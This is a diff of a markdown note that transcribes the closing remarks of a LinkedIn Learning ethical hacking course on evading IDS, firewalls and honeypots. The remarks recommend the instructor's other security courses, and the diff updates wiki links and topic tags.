+> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=26)** I'd like to invite you to visit my [[LinkedIn]] Learning page and check out my ethical hacking, security, and programming courses.
 >
 > **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=34)** If you want to learn about how to test mobile devices, then check out the Mobile Devices course.
 >
-> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=40)** If you'd like to learn about security for the cloud, then Cybersecurity for Cloud Computing is for you.
+> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=40)** If you'd like to learn about security for the cloud, then Cybersecurity for [[Cloud Computing]] is for you.
 >
 > **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=47)** Thanks again for joining me on this course and I hope to see you again soon.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (4), [[Cybersecurity]] (3), [[Ethical Hacking]] (3), cloud (2), [[LinkedIn]] (1)
+> **Frameworks & Libraries:** [[Cybersecurity]] (3), [[Ethical Hacking]] (3), [[Security Testing]] (1), [[LinkedIn]] (1), [[Cloud Computing]] (1)
 > **CLI Commands:** find (1)
 > **Speakers:** - [malcolm] (1)
 
